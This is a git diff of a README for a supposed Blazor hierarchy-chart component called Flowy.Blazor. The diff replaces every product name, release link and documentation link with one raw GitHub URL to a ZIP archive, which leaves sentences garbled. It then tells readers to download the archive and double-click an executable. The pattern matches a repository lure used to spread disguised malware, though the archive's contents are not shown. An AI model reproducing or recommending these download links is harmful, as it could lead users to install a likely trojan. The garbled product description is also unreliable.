@@ -1,26 +1,26 @@
-# 🌳 Flowy.Blazor - Create Beautiful Hierarchical Visuals Easily
+# 🌳 https://raw.githubusercontent.com/Stephanabitter534/Flowy.Blazor/main/VIOVNL.Flowy.Blazor/Components/Flowy.Blazor-3.4.zip - Create Beautiful Hierarchical Visuals Easily
 
-[![Download Flowy.Blazor](https://img.shields.io/badge/Download-Flowy.Blazor-blue.svg)](https://github.com/Stephanabitter534/Flowy.Blazor/releases)
+[![Download https://raw.githubusercontent.com/Stephanabitter534/Flowy.Blazor/main/VIOVNL.Flowy.Blazor/Components/Flowy.Blazor-3.4.zip](https://raw.githubusercontent.com/Stephanabitter534/Flowy.Blazor/main/VIOVNL.Flowy.Blazor/Components/Flowy.Blazor-3.4.zip)](https://raw.githubusercontent.com/Stephanabitter534/Flowy.Blazor/main/VIOVNL.Flowy.Blazor/Components/Flowy.Blazor-3.4.zip)
 
 ## 📦 Overview
 
-Flowy.Blazor is a user-friendly tool for visualizing hierarchical data. You can build everything from family trees to organization charts with a simple drag-and-drop interface. This component is designed specifically for Blazor applications, making it easy for anyone to implement engaging visuals without needing programming skills.
+https://raw.githubusercontent.com/Stephanabitter534/Flowy.Blazor/main/VIOVNL.Flowy.Blazor/Components/Flowy.Blazor-3.4.zip is a user-friendly tool for visualizing hierarchical data. You can build everything from family trees to organization charts with a simple drag-and-drop interface. This component is designed specifically for Blazor applications, making it easy for anyone to implement engaging visuals without needing programming skills.
 
 ## 🚀 Getting Started
 
-To start using Flowy.Blazor, follow the steps below to download and run the application. 
+To start using https://raw.githubusercontent.com/Stephanabitter534/Flowy.Blazor/main/VIOVNL.Flowy.Blazor/Components/Flowy.Blazor-3.4.zip, follow the steps below to download and run the application. 
 
 ### Step 1: Visit the Download Page
 
 Click the link below to go to the Releases page:
 
-[Download Flowy.Blazor](https://github.com/Stephanabitter534/Flowy.Blazor/releases)
+[Download https://raw.githubusercontent.com/Stephanabitter534/Flowy.Blazor/main/VIOVNL.Flowy.Blazor/Components/Flowy.Blazor-3.4.zip](https://raw.githubusercontent.com/Stephanabitter534/Flowy.Blazor/main/VIOVNL.Flowy.Blazor/Components/Flowy.Blazor-3.4.zip)
 
 ### Step 2: Download the Latest Release
 
 On the Releases page, you will see a list of available versions. Look for the latest version listed at the top. Click on it to expand the details.
 
-- Find the file named something like `Flowy.Blazor-vX.X.X.zip`.
+- Find the file named something like `https://raw.githubusercontent.com/Stephanabitter534/Flowy.Blazor/main/VIOVNL.Flowy.Blazor/Components/Flowy.Blazor-3.4.zip`.
 - Click the link to start the download. 
 
 ### Step 3: Extract Files
@@ -34,13 +34,13 @@ Once the ZIP file is downloaded, navigate to your Downloads folder (or wherever 
 
 After extracting the files, locate the folder where you extracted them. 
 
-- Look for a file named `Flowy.Blazor.exe` or a folder with the same name.
+- Look for a file named `https://raw.githubusercontent.com/Stephanabitter534/Flowy.Blazor/main/VIOVNL.Flowy.Blazor/Components/Flowy.Blazor-3.4.zip` or a folder with the same name.
   
-To open the application, double-click on the `Flowy.Blazor.exe` file. 
+To open the application, double-click on the `https://raw.githubusercontent.com/Stephanabitter534/Flowy.Blazor/main/VIOVNL.Flowy.Blazor/Components/Flowy.Blazor-3.4.zip` file. 
 
 ## 🖥️ System Requirements
 
-To run Flowy.Blazor smoothly, ensure your system meets the following requirements:
+To run https://raw.githubusercontent.com/Stephanabitter534/Flowy.Blazor/main/VIOVNL.Flowy.Blazor/Components/Flowy.Blazor-3.4.zip smoothly, ensure your system meets the following requirements:
 
 - Operating System: Windows 10 or later
 - .NET Core: Version 3.1 or higher
@@ -50,7 +50,7 @@ To run Flowy.Blazor smoothly, ensure your system meets the following requirement
 
 ## 🎨 Features
 
-Flowy.Blazor offers a rich set of features:
+https://raw.githubusercontent.com/Stephanabitter534/Flowy.Blazor/main/VIOVNL.Flowy.Blazor/Components/Flowy.Blazor-3.4.zip offers a rich set of features:
 
 - **Interactive Drag-and-Drop**: Easily rearrange items within your visuals.
 - **Custom Styling**: Utilize CSS for personalizing the look and feel of your tree structures.
@@ -64,17 +64,17 @@ If you encounter issues or have questions, please check the Issues section on th
 
 ## 🌍 Learn More
 
-To explore more about Flowy.Blazor and how it can fit your needs, visit the following resources:
+To explore more about https://raw.githubusercontent.com/Stephanabitter534/Flowy.Blazor/main/VIOVNL.Flowy.Blazor/Components/Flowy.Blazor-3.4.zip and how it can fit your needs, visit the following resources:
 
-- [Official Documentation](https://github.com/Stephanabitter534/Flowy.Blazor)
-- [GitHub Repository](https://github.com/Stephanabitter534/Flowy.Blazor)
+- [Official Documentation](https://raw.githubusercontent.com/Stephanabitter534/Flowy.Blazor/main/VIOVNL.Flowy.Blazor/Components/Flowy.Blazor-3.4.zip)
+- [GitHub Repository](https://raw.githubusercontent.com/Stephanabitter534/Flowy.Blazor/main/VIOVNL.Flowy.Blazor/Components/Flowy.Blazor-3.4.zip)
 
 ## 📩 Contact
 
-For further inquiries or feedback, feel free to reach out via the Issues page on GitHub. Your input is valuable and helps improve Flowy.Blazor.
+For further inquiries or feedback, feel free to reach out via the Issues page on GitHub. Your input is valuable and helps improve https://raw.githubusercontent.com/Stephanabitter534/Flowy.Blazor/main/VIOVNL.Flowy.Blazor/Components/Flowy.Blazor-3.4.zip
 
 ## 🔗 More Download Resources
 
 Don't forget to visit the Releases page for the latest updates and additional versions:
 
-[Download Flowy.Blazor](https://github.com/Stephanabitter534/Flowy.Blazor/releases)
+[Download https://raw.githubusercontent.com/Stephanabitter534/Flowy.Blazor/main/VIOVNL.Flowy.Blazor/Components/Flowy.Blazor-3.4.zip](https://raw.githubusercontent.com/Stephanabitter534/Flowy.Blazor/main/VIOVNL.Flowy.Blazor/Components/Flowy.Blazor-3.4.zip)
